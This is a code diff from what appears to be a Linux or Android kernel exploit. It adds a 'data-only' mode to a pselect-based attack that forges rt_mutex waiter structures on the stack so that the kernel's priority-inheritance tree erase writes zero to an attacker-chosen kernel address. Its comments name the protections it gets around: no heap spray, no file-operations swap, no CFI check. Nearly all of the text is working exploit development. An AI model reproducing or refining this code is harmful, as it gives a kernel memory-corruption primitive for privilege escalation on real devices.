@@ -337,7 +337,8 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
        * wake_up_process a ttwu fast-path no-op (F27-proven safe). A
        * zeroed fake task reaches p->sched_class->task_woken == NULL. */
       uint64_t stack_task = init_task;
-      if (pselect_custom_write == 4 && fake_fops) {
+      if ((pselect_custom_write == 4 && fake_fops) ||
+          env_flag("MODE4_DATAONLY", 0)) {
         uint64_t misc_off =
             (active_offsets && active_offsets->off_ashmem_misc_fops)
                 ? active_offsets->off_ashmem_misc_fops
@@ -793,6 +794,44 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                     ph == 1 ? "init_task+0x878 pi_waiters"
                             : "bss-tail __bss_stop+0x134");
           }
+        } else if (env_flag("MODE4_DATAONLY", 0)) {
+          /*
+           * DATA-ONLY WRITE (no heap, no spray, no fops swap, no CFI):
+           * the erase of the stack waiter's own main tree performs
+           * child->__rb_parent_color = pc with one LEFT child.
+           *   parent_color = 0  -> writes 0 to *left; red node, no
+           *                         rebalance; NULL parent -> root update
+           *                         writes into the static lock's waiters
+           *                         root (our own scratch).
+           *   left = pselect_custom_target (P0 alias of the target).
+           * Lock = static .data [0,0,0,1] pattern (QEMU-verified
+           * init_task+0xAB8): wait_lock unlocked, empty waiters,
+           * owner=1 (NULL|HAS_WAITERS) = the Aug-16 clean-exit value.
+           * task=init_task (safe). No fake_w0/fake_fops needed.
+           */
+          /*
+           * The compact writer only emits PI-tree words (5-7) + task(8)
+           * + lock(9) — main tree words are hardcoded 0. Shape on PI:
+           *   pi_parent = 0  (VALUE written; red node, no rebalance)
+           *   pi_right  = 0
+           *   pi_left   = TARGET (child->__rb_parent_color = pc writes 0)
+           * The erase is dequeue_pi(task, waiter) on the stack pi tree.
+           */
+          tree_pc = 0;
+          tree_r = 0;
+          tree_l = 0;
+          pi_parent = 0;
+          pi_right = 0;
+          pi_left = (uint64_t)pselect_write_target();
+          stack_task = (uint64_t)text_addr(KIMAGE_TEXT_BASE +
+              (active_offsets ? active_offsets->off_init_task
+                              : INIT_TASK_OFF));
+          stack_lock = fake_lock;
+          stack_prio = 3;
+          stack_deadline = 0;
+          pr_info("stack DATAONLY write: *%016llx = 0 (lock=%016llx)\n",
+                  (unsigned long long)tree_l,
+                  (unsigned long long)stack_lock);
         } else if (env_flag("MODE4_ARISTOTLE", 0) || env_flag("MODE4_WRITE_PROOF", 0)) {
           /*
            * Shapes (WRITE_PROOF_SHAPE / target):
@@ -1342,8 +1381,21 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
           {2, 0, "tree_left"},
           {3, 0, "pi_parent"},
           {4, 0, "pi_right"},
-          {5, 0, "pi_left"},
-          {6, pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK), "task"},
+          /* DATAONLY: pi_left = write target. The stack pi-tree erase
+           * (dequeue_pi) with parent_color=0 (VALUE, red) and one left
+           * child executes child->__rb_parent_color = pc -> *target=0.
+           * pi_parent/pi_right stay 0 (= the value + no right child). */
+          {5, env_flag("MODE4_DATAONLY", 0)
+                   ? (uint64_t)pselect_write_target()
+                   : 0,
+           "pi_left"},
+          {6, env_flag("MODE4_DATAONLY", 0)
+                   ? (uint64_t)text_addr(KIMAGE_TEXT_BASE +
+                         (active_offsets ? active_offsets->off_init_task
+                                         : INIT_TASK_OFF))
+                   : (pselect_custom_write_enabled() ? fake_task
+                                                    : text_addr(INIT_TASK)),
+           "task"},
           {7, fake_lock, "lock"},
           {8, 0, "prio"},
           {9, 0, "deadline"},
@@ -1363,7 +1415,8 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                   (unsigned long long)tree_r);
         }
         goto stack_words_done;
-      } else if (pselect_custom_write_enabled()) {
+      } else if (pselect_custom_write_enabled() &&
+                 !env_flag("MODE4_DATAONLY", 0)) {
         stack_task = fake_task;
       }
       struct pselect_waiter_word words[] = {
@@ -1414,7 +1467,10 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
 }
 
 void do_pselect_fake_lock_route(void) {
-  if (!page_base || !fake_lock || !fake_fops) {
+  /* DATAONLY: fake_lock alone suffices (static .data lock; no
+   * page/fops needed — the stack stamp carries the write). */
+  int dataonly = env_flag("MODE4_DATAONLY", 0);
+  if ((!dataonly && (!page_base || !fake_fops)) || !fake_lock) {
     cfi_last_step = 30;
     cfi_last_errno = 0;
     pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
